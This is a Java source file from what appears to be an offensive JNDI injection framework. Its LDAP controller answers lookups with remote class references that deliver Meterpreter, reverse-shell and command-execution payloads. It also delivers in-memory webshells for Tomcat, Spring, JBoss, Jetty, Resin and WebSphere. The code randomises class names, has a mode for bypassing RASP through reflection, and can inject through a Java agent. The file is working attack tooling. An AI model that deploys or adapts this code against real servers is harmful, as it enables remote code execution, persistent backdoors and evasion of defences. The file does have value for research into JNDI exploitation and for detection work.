package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.utils.InjShell;
import com.nu1r.jndi.template.*;
import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
import com.nu1r.jndi.template.resin.RFMSFromThreadF;
import com.nu1r.jndi.template.resin.RSMSFromThreadS;
import com.nu1r.jndi.template.spring.SpringInterceptorMS;
import com.nu1r.jndi.template.spring.SpringMemshellTemplate;
import com.nu1r.jndi.template.tomcat.*;
import com.nu1r.jndi.utils.Config;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

import java.net.URL;

import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.gadgets.utils.InjShell.insertLinAgent;
import static com.nu1r.jndi.gadgets.utils.InjShell.insertWinAgent;
import static com.nu1r.jndi.utils.Config.*;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private final  String      codebase = Config.codeBase;
    private static PayloadType payloadType;
    private        String[]    params;
    private       GadgetType  gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
        Entry     e         = new Entry(base);
        String    className = "";
        CtClass   ctClass;
        ClassPool pool;

        switch (payloadType) {
            case meterpreter:
                className = Meterpreter.class.getName();
                break;
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case nu1r:
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case springecho:
                className = SpringEchoTemplate.class.getName();
                break;
            case tomcatfilterjmx:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
                ctClass = pool.get(TFMSFromJMXF.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatfilterth:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
                ctClass = pool.get(TFMSFromThreadF.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatlistenerjmx:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
                ctClass = pool.get(TLMSFromJMXLi.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatlistenerth:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
                ctClass = pool.get(TLMSFromThreadLi.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatservletjmx:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
                ctClass = pool.get(TSMSFromJMXS.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatservletth:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
                ctClass = pool.get(TSMSFromThreadS.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case jbossfilter:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
                ctClass = pool.get(JBFMSFromContextF.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case jbossservlet:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
                ctClass = pool.get(JBSMSFromContextS.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case webspherememshell:
                className = WebsphereMemshellTemplate.class.getName();
                break;
            case springinterceptor:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
                ctClass = pool.get(SpringInterceptorMS.class.getName());
                pool.insertClassPath(new ClassClassPath(SpringMemshellTemplate.class));
                String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
                CtClass springTemplateClass = pool.get(target);
                // 类名后加时间戳
                String clazzName = target + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                // 修改b64字节码
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case issuccess:
                className = isSuccess.class.getName();
                break;
            case jettyfilter:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
                ctClass = pool.get(JFMSFromJMXF.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case jettyservlet:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
                ctClass = pool.get(JSMSFromJMXS.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case wsfilter:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
                ctClass = pool.get(WSFMSFromThread.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatexecutor:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
                ctClass = pool.get(TWSMSFromThread.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case resinfilterth:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
                ctClass = pool.get(RFMSFromThreadF.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case resinservletth:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
                ctClass = pool.get(RSMSFromThreadS.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
            case tomcatupgrade:
                Config.init();
                pool = ClassPool.getDefault();
                pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
                ctClass = pool.get(TUGMSFromJMXuP.class.getName());
                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
                ctClass.setName(generateClassName());
                if (winAgent){
                    className = insertWinAgent(ctClass);
                    break;
                }
                if (linAgent){
                    className = insertLinAgent(ctClass);
                    break;
                }
                className = ctClass.getName();
                ctClass.writeFile();
                break;
        }

        URL turl = new URL(new URL(this.codebase), className + ".class");
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP reference result for |@" + base + " @|MAGENTA redirecting to |@" + turl));
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", this.codebase);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        if (className.equals("com.feihong.ldap.template.Meterpreter")) {
            e.addAttribute("javaFactory", "Meterpreter");
        }
        e.addAttribute("javaFactory", className);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.urlr) {
                String url1    = Util.getCmdFromBase(base);
                int    result1 = url1.indexOf("-");
                if (result1 != -1) {
                    String[] U = url1.split("-");
                    int      i = U.length;
                    if (i >= 1) {
                        URL_PATTERN = U[0];
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
                    }
                    if (i >= 2) {
                        Shell_Type = U[1];
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
                    }
                    if (url1.contains("obscure")) {
                        IS_OBSCURE = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@" ));
                    }
                    if (url1.contains("winAgent")) {
                        winAgent = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
                    }
                    if (url1.contains("linAgent")) {
                        linAgent = true;
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
                    }
                } else {
                    URL_PATTERN = url1;
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
                }
            }

            switch (payloadType) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                    params = new String[]{url};
                    break;
                case nu1r:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                    params = results;
                    break;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
